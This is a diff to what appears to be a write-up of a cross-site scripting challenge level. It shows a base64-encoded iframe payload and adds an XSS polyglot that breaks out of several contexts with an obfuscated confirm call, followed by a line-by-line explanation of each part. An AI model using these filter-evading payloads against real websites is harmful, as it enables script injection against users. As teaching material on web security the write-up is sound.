@@ -207,3 +207,22 @@ The code that we will then put into the search box to finish the level is:
 
 :::html
 `"><iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4="></iframe>`
+
+
+```-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>```
+```
+-->          Breaks comment context  
+'            Breaks Attribute Context  
+"            Breaks attribute context  
+/>           Closes an open tag  
+</sCript>    Breaks JS context  
+<deTailS     A less known tag  
+open         To eliminate user interaction required for execution
+x            Dummy attribute
+">"          Mimics the closing of tag
+ontoggle     A less known event handler
+()           Parentheses around the function
+co\u006efirm "confirm" function with Unicoded 'n'
+``           Backticks instead of ()
+Note that we may only need a certain portion of the polyglot, depending on our situation. Do not copy & paste blindly.
+```
